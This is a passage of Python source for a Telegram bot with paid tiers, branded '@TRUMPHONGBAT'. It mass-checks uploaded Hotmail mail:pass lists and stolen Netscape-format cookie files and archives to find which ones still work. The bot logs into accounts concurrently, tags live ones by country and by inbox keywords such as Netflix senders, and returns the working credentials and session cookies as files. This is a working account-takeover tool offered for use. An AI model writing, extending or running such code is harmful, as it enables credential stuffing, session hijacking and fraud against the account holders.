        if not is_group_chat:
            await show_start_login(update=update)
        return
    
    user_id = user.id
    get_user_record(user_id, username=user.username, first_name=user.first_name)
    
    if not is_group_chat and chat_id is not None and is_restricted_private(user_id, chat_id):
        keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],
                    [InlineKeyboardButton("Main Menu", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
        return
    
    mode = context.user_data.get('mode')
    if mode == 'hotmail_keyword':
        text = update.message.text or ""
        text = text.strip()
        lines = [line.strip() for line in text.splitlines() if line.strip()]
        if not lines:
            await update.message.reply_text("Please send keyword text or use Skip.")
            return

        email_pattern = re.compile(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$')
        for line in lines:
            if not email_pattern.match(line):
                await update.message.reply_text("❌ Invalid keyword format! Please enter valid email addresses only (e.g., no-reply@netflix.com). You can send multiple keywords by putting each on a new line.")
                return

        keywords_dir = Path("keywords")
        keywords_dir.mkdir(parents=True, exist_ok=True)
        keyword_path = keywords_dir / f"keyword_{user_id}_{int(time.time())}.txt"
        keyword_path.write_text("\n".join(lines), encoding="utf-8")
        context.user_data['keyword_file_path'] = str(keyword_path)
        context.user_data['mode'] = 'hotmail_checker'
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        preview_list = lines[:10]
        preview_text = "\n".join([f"- {kw}" for kw in preview_list])
        if len(lines) > 10:
            preview_text += f"\n... and {len(lines) - 10} more."
            
        await update.message.reply_text(
            f"✅ Successfully received {len(lines)} keywords!\n\n"
            f"Keywords received:\n{preview_text}\n\n"
            "Now send a .txt file containing hotmail in format mail:pass, one per line.",
            reply_markup=reply_markup
        )
        return
    
    return

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user:
        return
    
    chat = update.effective_chat
    chat_id = chat.id if chat else None
    is_group_chat = chat_id and str(chat_id).startswith("-")
    
    if is_group_chat:
        has_selected_service = 'selected_service' in context.user_data
        has_mode = 'mode' in context.user_data and context.user_data.get('mode') in ['hotmail_checker', 'hotmail_keyword']
        
        if not has_selected_service and not has_mode:
            message_text = update.message.caption or update.message.text or ""
            bot_username = context.bot.username if context.bot else None
            is_mentioned = False
            
            if bot_username:
                is_mentioned = f"@{bot_username}" in message_text
            
            is_reply_to_bot = False
            if update.message.reply_to_message:
                replied_user = update.message.reply_to_message.from_user
                if replied_user and replied_user.is_bot:
                    is_reply_to_bot = True
            
            if not is_mentioned and not is_reply_to_bot:
                return
    
    if not is_registered(user.id):
        if not is_group_chat:
            await show_start_login(update=update)
        return
    
    user_id = user.id
    get_user_record(user_id, username=user.username, first_name=user.first_name)
    
    if not is_group_chat and chat_id is not None and is_restricted_private(user_id, chat_id):
        keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],
                    [InlineKeyboardButton("Main Menu", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
        return

    mode = context.user_data.get('mode')

    if mode == 'hotmail_keyword':
        doc = update.message.document
        if not doc:
            await update.message.reply_text("No document attached.")
            return
        file = await doc.get_file()
        file_name = clean_filename(doc.file_name or "keyword.txt")
        ext = Path(file_name).suffix.lower()
        if ext != '.txt':
            await update.message.reply_text("Please send a .txt keyword file or type keywords as text.")
            return
        file_bytes = await file.download_as_bytearray()
        try:
            content = file_bytes.decode('utf-8')
        except UnicodeDecodeError:
            content = file_bytes.decode('latin-1', errors='ignore')
            
        lines = [line.strip() for line in content.splitlines() if line.strip()]
        if not lines:
            await update.message.reply_text("❌ Invalid file content! File is empty.")
            return

        email_pattern = re.compile(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$')
        for line in lines:
            if not email_pattern.match(line):
                await update.message.reply_text("❌ Invalid file content! All keywords inside the .txt file must be valid email addresses (e.g., no-reply@netflix.com).")
                return

        keywords_dir = Path("keywords")
        keywords_dir.mkdir(parents=True, exist_ok=True)
        keyword_path = keywords_dir / f"keyword_{user_id}_{int(time.time())}.txt"
        keyword_path.write_bytes(file_bytes)
        context.user_data['keyword_file_path'] = str(keyword_path)
        context.user_data['mode'] = 'hotmail_checker'
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        preview_list = lines[:10]
        preview_text = "\n".join([f"- {kw}" for kw in preview_list])
        if len(lines) > 10:
            preview_text += f"\n... and {len(lines) - 10} more."
            
        await update.message.reply_text(
            f"✅ Successfully loaded {len(lines)} keywords from file!\n\n"
            f"Keywords received:\n{preview_text}\n\n"
            "Now send a .txt file containing hotmail in format mail:pass, one per line.",
            reply_markup=reply_markup
        )
        return

    if mode == 'hotmail_checker':
        can_scan, error_msg = can_user_scan(user_id)
        if not can_scan:
            keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(error_msg, reply_markup=reply_markup)
            return
        doc = update.message.document
        if not doc:
            await update.message.reply_text("No document attached.")
            return
        file = await doc.get_file()
        file_name = clean_filename(doc.file_name or "hotmail.txt")
        ext = Path(file_name).suffix.lower()
        if ext != '.txt':
            await update.message.reply_text("Please send a .txt file containing hotmail in format mail:pass.")
            return
        file_bytes = await file.download_as_bytearray()
        try:
            content = file_bytes.decode('utf-8')
        except UnicodeDecodeError:
            content = file_bytes.decode('latin-1', errors='ignore')

        raw_lines = [line.strip() for line in content.splitlines() if line.strip()]
        accounts = []
        for line in raw_lines:
            parsed = parse_hotmail_line(line)
            if parsed:
                email, password = parsed
                accounts.append((email, password, line))

        if not accounts:
            await update.message.reply_text("File does not contain any hotmail in mail:pass format.")
            return

        total = len(accounts)
        live_list = []
        die_count = 0
        bar_length = 20
        live_preview = []
        live_with_keyword = []
        live_without_keyword = []
        keyword_file_path = context.user_data.get('keyword_file_path')
        context.user_data['hotmail_live_list'] = []
        context.user_data['hotmail_status'] = {}
        context.user_data['hotmail_view'] = 'status'

        status_msg = await update.message.reply_text(
            "┌─── ⋆⋅☆⋅⋆ ── CHECKING STATUS ── ⋆⋅☆⋅⋆ ──┐\n\n"
            "   ░▒▓█ PROCESSING LIST... █▓▒░\n\n"
            f"   ⫸ Total   : {total}\n"
            "   ⫸ Checked : 0\n"
            "   ░▒▓█░▒▓█░▒▓█░▒▓█░▒▓█░▒▓█┌──\n"
            "   🟢 LIVE   : 0\n"
            "   🔴 DIE    : 0\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
            f"   PROGRESS: [{'░' * bar_length}] 0%\n\n"
            "   Status: ⏳ Checking...\n\n"
            "└────────────────────────────────────────┘"
        )

        last_update_time = time.time()
        
        semaphore = asyncio.Semaphore(20)

        async def check_account(_idx, _email, _password, _original_line):
            async with semaphore:
                try:
                    if keyword_file_path:
                        _result, _has_keyword, _keyword_string = await asyncio.to_thread(
                            check_hotmail_api_with_keywords, _email, _password, keyword_file_path
                        )
                    else:
                        _result = await asyncio.to_thread(check_hotmail_api, _email, _password)
                        _has_keyword = False
                        _keyword_string = ""
                except Exception as e:
                    logger.error(f"Error checking hotmail {_email}: {e}")
                    _result = 'die'
                    _has_keyword = False
                    _keyword_string = ""
                
                try:
                    if _result == 'live':
                        _country = await asyncio.to_thread(get_hotmail_country, _email, _password)
                    else:
                        _country = ""
                except Exception:
                    _country = "Unknown"
                    
                return _idx, _email, _password, _original_line, _result, _has_keyword, _keyword_string, _country

        tasks = [
            check_account(i, e, p, l) 
            for i, (e, p, l) in enumerate(accounts, start=1)
        ]

        checked = 0
        
        for future in asyncio.as_completed(tasks):
            idx, email, password, original_line, result, has_keyword, keyword_string, country = await future
            checked += 1
            idx = checked
            
            try:
                if result == 'live':
                    if keyword_file_path:
                        if has_keyword:
                            if keyword_string:
                                formatted_line = f"{original_line}| keyword: {keyword_string}| country: {country}"
                            else:
                                formatted_line = f"{original_line}| country: {country}"
                            live_with_keyword.append(formatted_line)
                        else:
                            formatted_line = f"{original_line}| country: {country}"
                            live_without_keyword.append(formatted_line)
                            live_list.append(formatted_line)
                    else:
                        formatted_line = f"{original_line}| country: {country}"
                        live_list.append(formatted_line)
                    
                    preview_line = live_without_keyword[-1] if (keyword_file_path and not has_keyword) else (live_list[-1] if not keyword_file_path else None)
                    if preview_line:
                        live_preview.append(preview_line)
                        if len(live_preview) > 5:
                            live_preview = live_preview[-5:]
                else:
                    die_count += 1

                if keyword_file_path:
                    context.user_data['hotmail_live_list'] = live_without_keyword.copy()
                    context.user_data['hotmail_live_with_keyword'] = live_with_keyword.copy()
                else:
                    context.user_data['hotmail_live_list'] = live_list.copy()

                filled = int(bar_length * checked / total)
                bar = "[" + "█" * filled + "░" * (bar_length - filled) + "]"
                percent = int(checked * 100 / total)
                status_line = "✅ Task Completed!" if checked == total else "⏳ Checking..."
                context.user_data['hotmail_status'] = {
                    'total': total,
                    'checked': checked,
                    'die_count': die_count,
                    'live_list': live_list.copy(),
                    'live_preview': live_preview.copy(),
                    'bar': bar,
                    'percent': percent,
                    'status_line': status_line,
                    'has_keyword': bool(keyword_file_path),
                }

                view = context.user_data.get('hotmail_view', 'status')

                if view == 'status':
                    live_block = ""
                    if checked != total and live_preview:
                        preview_lines = "\n".join(f"   {line}" for line in live_preview)
                        live_block = (
                        "   LIVE HOTMAIL:\n"
                        f"{preview_lines}\n"
                        "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
                    )

                    text = (
                    "┌─── ⋆⋅☆⋅⋆ ── CHECKING STATUS ── ⋆⋅☆⋅⋆ ──┐\n\n"
                    "   ░▒▓█ PROCESSING LIST... █▓▒░\n\n"
                    f"   ⫸ Total   : {total}\n"
                    f"   ⫸ Checked : {checked}\n"
                    "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
                    f"   🟢 LIVE   : {len(live_without_keyword) + len(live_with_keyword) if keyword_file_path else len(live_list)}\n"
                    f"   🔴 DIE    : {die_count}\n"
                    "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
                    f"{live_block}"
                    f"   PROGRESS: {bar} {percent}%\n\n"
                    f"   Status: {status_line}\n\n"
                    "└────────────────────────────────────────┘"
                    )

                    keyboard_rows = []
                    if keyword_file_path:
                        if len(live_without_keyword) >= 5:
                            keyboard_rows.append([InlineKeyboardButton("Show All Hotmail Live", callback_data="show_hotmail_live")])
                        if len(live_with_keyword) >= 1:
                            keyboard_rows.append([InlineKeyboardButton("Show Hotmail With Keyword", callback_data="show_hotmail_keyword")])
                    elif len(live_list) >= 5:
                        keyboard_rows.append([InlineKeyboardButton("Show Hotmail Live", callback_data="show_hotmail_live")])
                    reply_markup = InlineKeyboardMarkup(keyboard_rows) if keyboard_rows else None

                    current_time = time.time()
                    if current_time - last_update_time >= 3.0 or checked == total:
                        last_update_time = current_time
                        await safe_edit_message_text(status_msg, text, reply_markup=reply_markup)

                elif view == 'full':
                    live_list_full = context.user_data.get('hotmail_live_list', [])
                    text_body = "\n".join(live_list_full) if live_list_full else ""
                    keyboard = [[InlineKeyboardButton("Back", callback_data="back_hotmail_status")]]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    try:
                        await safe_edit_message_text(
                            status_msg,
                            "LIVE HOTMAIL LIST:\n```" + text_body + "```",
                            reply_markup=reply_markup,
                            parse_mode="Markdown"
                        )
                    except Exception:
                        pass

                elif view == 'keyword':
                    live_with_keyword_full = context.user_data.get('hotmail_live_with_keyword', [])
                    text_body = "\n".join(live_with_keyword_full) if live_with_keyword_full else ""
                    keyboard = [[InlineKeyboardButton("Back", callback_data="back_hotmail_status")]]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    try:
                        await safe_edit_message_text(
                            status_msg,
                            "HOTMAIL WITH KEYWORD:\n```" + text_body + "```",
                            reply_markup=reply_markup,
                            parse_mode="Markdown"
                        )
                    except Exception:
                        pass
                        
            except Exception as e:
                logger.error(f"Error processing hotmail account {checked}/{total}: {e}")
                die_count += 1
                filled = int(bar_length * checked / total)
                bar = "[" + "█" * filled + "░" * (bar_length - filled) + "]"
                percent = int(checked * 100 / total)
                status_line = "⏳ Checking..."
                context.user_data['hotmail_status'] = {
                    'total': total,
                    'checked': checked,
                    'die_count': die_count,
                    'live_list': live_list.copy(),
                    'live_preview': live_preview.copy(),
                    'bar': bar,
                    'percent': percent,
                    'status_line': status_line,
                    'has_keyword': bool(keyword_file_path),
                }
                try:
                    view = context.user_data.get('hotmail_view', 'status')
                    if view == 'status':
                        text = (
                            "┌─── ⋆⋅☆⋅⋆ ── CHECKING STATUS ── ⋆⋅☆⋅⋆ ──┐\n\n"
                            "   ░▒▓█ PROCESSING LIST... █▓▒░\n\n"
                            f"   ⫸ Total   : {total}\n"
                            f"   ⫸ Checked : {checked}\n"
                            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
                            f"   🟢 LIVE   : {len(live_without_keyword) + len(live_with_keyword) if keyword_file_path else len(live_list)}\n"
                            f"   🔴 DIE    : {die_count}\n"
                            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
                            f"   PROGRESS: {bar} {percent}%\n\n"
                            f"   Status: {status_line}\n\n"
                            "└────────────────────────────────────────┘"
                        )
                        current_time = time.time()
                        if current_time - last_update_time >= 3.0 or checked == total:
                            last_update_time = current_time
                            await safe_edit_message_text(status_msg, text, reply_markup=None)
                except Exception:
                    pass
                continue

        # ---- Hotmail Country Export Logic ----
        country_data = {}
        all_lives = []
        if keyword_file_path:
            all_lives.extend(live_with_keyword)
            all_lives.extend(live_without_keyword)
        else:
            all_lives.extend(live_list)

        for line in all_lives:
            # Example format: test@hotmail.com:pass | keyword: xyz | country: US
            # Or without keyword: test@hotmail.com:pass | country: US
            if "| country:" in line:
                country_code = line.split("| country:")[1].strip()
            else:
                country_code = "N/A"
            if country_code not in country_data:
                country_data[country_code] = []
            country_data[country_code].append(line)

        context.user_data['country_data'] = country_data
        
        # Build Keyboard Chunks (4 buttons per row)
        keyboard = []
        if country_data:
            country_buttons = [
                InlineKeyboardButton(f"{c} ({len(emails)})", callback_data=f"export_country_{c}")
                for c, emails in sorted(country_data.items())
            ]
            for i in range(0, len(country_buttons), 4):
                keyboard.append(country_buttons[i:i + 4])
                
        keyboard.append([InlineKeyboardButton("Back to Menu", callback_data="main_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)

        if live_list or (keyword_file_path and live_without_keyword):
            if keyword_file_path:
                if live_with_keyword:
                    output_hit = "#Hotmail Live Checker By Bot: @TRUMPHONGBAT\n" + "\n".join(live_with_keyword)
                    buffer_hit = BytesIO(output_hit.encode('utf-8'))
                    buffer_hit.name = "hotmail_keyword_hit.txt"
                    total_with_keyword = len(live_with_keyword) + len(live_without_keyword) if live_without_keyword else len(live_with_keyword)
                    await update.message.reply_document(
                        document=buffer_hit,
                        filename="hotmail_keyword_hit.txt",
                        caption=f"Valid with keyword: {len(live_with_keyword)}/{total_with_keyword}"
                    )
                if live_without_keyword:
                    output_free = "#Hotmail Live Checker By Bot: @TRUMPHONGBAT\n" + "\n".join(live_without_keyword)
                    buffer_free = BytesIO(output_free.encode('utf-8'))
                    buffer_free.name = "hotmail_valid_nokeyword.txt"
                    total_live = len(live_with_keyword) + len(live_without_keyword) if live_with_keyword else len(live_without_keyword)
                    await update.message.reply_document(
                        document=buffer_free,
                        filename="hotmail_valid_nokeyword.txt",
                        caption=f"Valid without keyword: {len(live_without_keyword)}/{total_live}"
                    )
            else:
                output = "#HOTMAIL CHECKER @TRUMPHONGBAT\n" + "\n".join(live_list)
                buffer = BytesIO(output.encode('utf-8'))
                buffer.name = "hotmail_valid.txt"
                await update.message.reply_document(
                    document=buffer,
                    filename="hotmail_valid.txt",
                    caption=f"Valid: {len(live_list)}/{total}"
                )
        else:
            await update.message.reply_text("No valid hotmail accounts found.")

        increment_file_count(user_id)
        increment_daily_scans(1)
        
        await update.message.reply_text(
            "✅ File processed! You can download separate country lists below, or send more files/go back.",
            reply_markup=reply_markup
        )
        return

    if 'selected_service' not in context.user_data:
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Please choose a service first from the menu.", reply_markup=reply_markup)
        return
    can_scan, error_msg = can_user_scan(user_id)
    if not can_scan:
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(error_msg, reply_markup=reply_markup)
        return

    selected_service = context.user_data['selected_service']
    doc = update.message.document
    if not doc:
        await update.message.reply_text("No document attached.")
        return

    status_msg = await update.message.reply_animation(
        animation="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExMmluaW9jcDRjcm1uMzRsNDJpZjZzZ3pxd252OXQzaGJxYXcwMjFnZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7bu8sRnYpTOG1p8k/giphy.gif",
        caption="The bot is scanning your file, please wait."
    )

    try:
        file = await doc.get_file(connect_timeout=60, read_timeout=60)
        file_name = clean_filename(doc.file_name or "cookie.txt")
        ext = Path(file_name).suffix.lower()
        file_bytes = await file.download_as_bytearray()
    except TimedOut:
        try:
            await status_msg.delete()
        except Exception:
            pass
        await update.message.reply_text("[Error] Telegram network timeout while downloading the file. Please try sending the file again.")
        return
    except Exception as e:
        try:
            await status_msg.delete()
        except Exception:
            pass
        await update.message.reply_text(f"[Error] Failed to read file: {str(e)}")
        return

    processed_files = 0
    all_results = {}
    live_cookies = {}

    def scan_zip_sync(file_bytes_inner, selected_service_inner):
        processed_files_inner = 0
        all_results_inner = {}
        live_cookies_inner = {}
        try:
            with zipfile.ZipFile(BytesIO(file_bytes_inner)) as zf:
                # Scan ALL files in ZIP, no extension filter
                names = [n for n in zf.namelist() if not n.endswith('/')]
                files_to_process = []
                for n in names:
                    try:
                        with zf.open(n) as f:
                            raw = f.read()
                        try:
                            content = raw.decode('utf-8', errors='ignore')
                        except Exception:
                            continue
                        # Content-based validation: only process files with valid Netscape cookies
                        if len(parse_cookies_txt(content)) == 0:
                            continue
                        files_to_process.append((Path(n).name, content))
                    except Exception as e:
                        logger.error(f"Error reading file {n} from zip: {e}")
                if not files_to_process:
                    return 0, "❌ Không tìm thấy cookie định dạng Netscape hợp lệ trong file của bạn.", {}
                with ThreadPoolExecutor(max_workers=5) as executor:
                    future_to_file = {
                        executor.submit(process_single_file, name, content, selected_service_inner): name
                        for name, content in files_to_process
                    }
                    for future in as_completed(future_to_file):
                        file_name_inner = future_to_file[future]
                        try:
                            fname, result = future.result()
                            all_results_inner[fname] = result
                            if 'error' not in result:
                                if selected_service_inner == 'all':
                                    all_res = result.get('all_results', {})
                                    for sv_name, sv_result in all_res.items():
                                        if sv_result.get('status') == 'success':
                                            if sv_name not in live_cookies_inner:
                                                live_cookies_inner[sv_name] = []
                                            live_cookies_inner[sv_name].append((fname, sv_result))
                                else:
                                    if result.get('status') == 'success':
                                        sv_name = selected_service_inner
                                        if sv_name not in live_cookies_inner:
                                            live_cookies_inner[sv_name] = []
                                        live_cookies_inner[sv_name].append((fname, result))
                            processed_files_inner += 1
                        except Exception as e:
                            logger.error(f"Error processing file in zip: {e}")
            return processed_files_inner, None, live_cookies_inner
        except zipfile.BadZipFile:
            return 0, "Invalid .zip file.", {}
        except Exception as e:
            return 0, f"Error scanning zip: {str(e)}", {}

    try:
        if ext == '.zip':
            processed_files, error_message, live_cookies = await asyncio.to_thread(scan_zip_sync, file_bytes, selected_service)
            if error_message:
                try:
                    await status_msg.delete()
                except Exception:
                    pass
                await update.message.reply_text(error_message)
            else:
                summary = []
                if selected_service == 'all':
                    for svc, cookies_list in live_cookies.items():
                        svc_name = SERVICES.get(svc, svc).title()
                        summary.append(f"{svc_name}: {len(cookies_list)} live cookies")
                else:
                    svc_name = SERVICES.get(selected_service, selected_service).title()
                    summary.append(f"{svc_name}: {sum(len(v) for v in live_cookies.values())} live cookies")
                try:
                    await status_msg.delete()
                except Exception:
                    pass
                if summary:
                    summary_text = "<b>Scan completed:</b>\n" + "\n".join(summary)
                else:
                    summary_text = "<b>Scan completed:</b> No live cookies found."
                    
                if live_cookies:
                    await send_live_cookies_zip(update, live_cookies, selected_service, caption_text=summary_text)
                else:
                    await update.message.reply_text(summary_text, parse_mode='HTML')
        else:
            # Content-based detection: try to decode and parse as cookie file (any extension)
            try:
                content = file_bytes.decode('utf-8', errors='ignore')
            except Exception:
                try:
                    await status_msg.delete()
                except Exception:
                    pass
                await update.message.reply_text("❌ Không tìm thấy cookie định dạng Netscape hợp lệ trong file của bạn.")
                return

            # Validate content has at least one valid Netscape cookie
            if len(parse_cookies_txt(content)) == 0:
                try:
                    await status_msg.delete()
                except Exception:
                    pass
                await update.message.reply_text("❌ Không tìm thấy cookie định dạng Netscape hợp lệ trong file của bạn.")
                return

            file_name, result = await asyncio.to_thread(process_single_file, file_name, content, selected_service)
            processed_files += 1

            if 'error' in result:
                try:
                    await status_msg.delete()
                except Exception:
                    pass
                await update.message.reply_text(f"Error: {result['error']}")
            else:
                if selected_service == 'all':
                    summary_lines = [f"<b>Scan Results for {file_name}:</b>"]
                    for svc, r in result.get('all_results', {}).items():
                        icon = get_status_icon(r.get('status'))
                        plan = extract_public_plan_info(r.get('plan_info', '')) or ""
                        plan = f" • {plan}" if plan else ""
                        if r.get('status') != 'success':
                            plan = ""
                        
                        status_str = get_status_text(r.get('status'))
                        summary_lines.append(f"{icon} {SERVICES.get(svc, svc).title()}: {status_str}{plan}")

                    if not result.get('all_results'):
                        summary_lines.append("No target cookies found.")

                    try:
                        await status_msg.delete()
                    except Exception:
                        pass
                        
                    summary_text = "\n".join(summary_lines)

                    live_cookies = {}
                    for svc, r in result.get('all_results', {}).items():
                        if r.get('status') == 'success':
                            live_cookies[svc] = [(file_name, r)]

                    if live_cookies:
                        await send_live_cookies_zip(update, live_cookies, selected_service, caption_text=summary_text)
                    else:
                        await update.message.reply_text(summary_text, parse_mode='HTML')

                else:
                    status = result.get('status')
                    icon = get_status_icon(status)
                    plan = extract_public_plan_info(result.get('plan_info', '')) or ""
                    plan = f"\n{plan}" if plan else ""
                    if status != 'success':
                        plan = ""

                    status_str = get_status_text(status)

                    message = f"<b>{file_name}</b>\n{icon} {status_str}{plan}"
                    try:
                        await status_msg.delete()
                    except Exception:
                        pass
                    
                    if status == 'success':
                        live_cookies = {selected_service: [(file_name, result)]}
                        await send_live_cookies_zip(update, live_cookies, selected_service, caption_text=message)
                    else:
                        await update.message.reply_text(message, parse_mode='HTML')

        if processed_files > 0:
            increment_file_count(user_id)
            increment_daily_scans(processed_files)

    except RetryAfter as e:
        wait_for = int(getattr(e, "retry_after", 5))
        await asyncio.sleep(wait_for)
        try:
            try:
                await status_msg.delete()
            except Exception:
                pass
            await update.message.reply_text("Telegram is rate limiting. Please resend the file after a few seconds.")
        except Exception:
            pass
    except TimedOut:
        try:
            try:
                await status_msg.delete()
            except Exception:
                pass
            await update.message.reply_text("Connection to Telegram timed out. Please try scanning the file again.")
        except Exception:
            pass

async def send_live_cookies_zip(update: Update, live_cookies, selected_service, caption_text="✅ Live cookies structured archive"):
    user_id = update.effective_user.id
    temp_dir = Path(f"temp_results_{user_id}_{int(time.time())}")
    zip_path = None
    
    try:
        if not live_cookies:
            return
            
        temp_dir.mkdir(parents=True, exist_ok=True)
        
        has_content = False
        if selected_service == 'all':
            for service_key, cookies_list in live_cookies.items():
                service_name = SERVICES.get(service_key, service_key).title()
                service_dir = temp_dir / service_name
                service_dir.mkdir(parents=True, exist_ok=True)
                
                for file_name, result in cookies_list:
                    content = result.get('original_content', '')
                    if content:
                        filtered_content = filter_cookie_text_by_service(content, service_key)
                        if filtered_content:
                            safe_name = str(file_name)
                            name_part, ext_part = os.path.splitext(safe_name)
                            if len(name_part) > 60:
                                name_part = name_part[:60]
                            safe_name = name_part + (ext_part if ext_part else ".txt")
                            safe_name = re.sub(r'[\\/*?:"<>|]', '_', safe_name)
                            
                            file_path = service_dir / safe_name
                            file_path.write_text(filtered_content, encoding='utf-8')
                            has_content = True
        else:
            service_name = SERVICES.get(selected_service, selected_service).title()
            service_dir = temp_dir / service_name
            service_dir.mkdir(parents=True, exist_ok=True)
            
            for file_name, result in live_cookies.get(selected_service, []):
                content = result.get('original_content', '')
                if content:
                    filtered_content = filter_cookie_text_by_service(content, selected_service)
                    if filtered_content:
                        safe_name = str(file_name)
                        name_part, ext_part = os.path.splitext(safe_name)
                        if len(name_part) > 60:
                            name_part = name_part[:60]
                        safe_name = name_part + (ext_part if ext_part else ".txt")
                        safe_name = re.sub(r'[\\/*?:"<>|]', '_', safe_name)
                        
                        file_path = service_dir / safe_name
                        file_path.write_text(filtered_content, encoding='utf-8')
                        has_content = True
        
        if not has_content:
            await update.message.reply_text("No domains matched the required format for packaging.")
            return
            
        zip_base_name = f"Results_{user_id}_{int(time.time())}"
        zip_path_str = shutil.make_archive(zip_base_name, 'zip', temp_dir)
        zip_path = Path(zip_path_str)
        
        with open(zip_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename="Results.zip",
                caption=caption_text,
                parse_mode='HTML'
            )

    except Exception as e:
        logger.error(f"Error creating isolated ZIP structure: {e}")
        await update.message.reply_text(f"Error creating separated structured ZIP: {str(e)}")
    finally:
        if temp_dir.exists():
            shutil.rmtree(temp_dir)
        if zip_path and zip_path.exists():
            os.remove(zip_path)

async def show_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_start_login(update=update)

async def handle_new_chat_members(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.new_chat_members:
        return
    
    chat = update.effective_chat
    chat_id = chat.id if chat else None
    
    if not chat_id or not str(chat_id).startswith("-"):
        return
    
    bot_id = context.bot.id
    new_members = update.message.new_chat_members
    
    bot_added = any(member.id == bot_id for member in new_members)
    
    if bot_added:
        added_by_user = update.message.from_user
        if not added_by_user:
            try:
                await context.bot.leave_chat(chat_id=chat_id)
            except Exception:
                pass
            return
        
        added_by_user_id = added_by_user.id
        
        if str(chat_id) in ALLOWED_GROUP_CHAT_IDS:
            try:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="✅ Bot has been added to the group. Bot is ready to operate!"
                )
            except Exception:
                pass
        elif not ADMIN_USER_ID or str(added_by_user_id) != ADMIN_USER_ID:
            try:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="❌ Only the bot admin is allowed to add the bot to groups. The bot will leave this group."
                )
                await asyncio.sleep(2)
                await context.bot.leave_chat(chat_id=chat_id)
            except Exception as e:
                try:
                    await context.bot.leave_chat(chat_id=chat_id)
                except Exception:
                    pass
        else:
            try:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="✅ Bot has been added to the group by admin. Bot is ready to operate!"
                )
            except Exception:
                pass

def main():
    _fast_print(f"Starting bot with curl_cffi: {HAS_CURL_CFFI}")
    _fast_print("Make sure to install required packages:")
    _fast_print("pip install curl-cffi python-telegram-bot requests")

    application = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("menu", menu))
    application.add_handler(CommandHandler("checkplan", check_plan))
    application.add_handler(CommandHandler("stats", admin_stats))
    application.add_handler(CommandHandler("setvip", admin_set_vip))
    application.add_handler(CommandHandler("delvip", admin_del_vip))
    application.add_handler(CommandHandler("getkey", admin_get_key))
    application.add_handler(CommandHandler("removekey", admin_remove_key))
    application.add_handler(CommandHandler("activatekey", activate_key_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, handle_new_chat_members))
    application.run_polling()

if __name__ == "__main__":
    main()


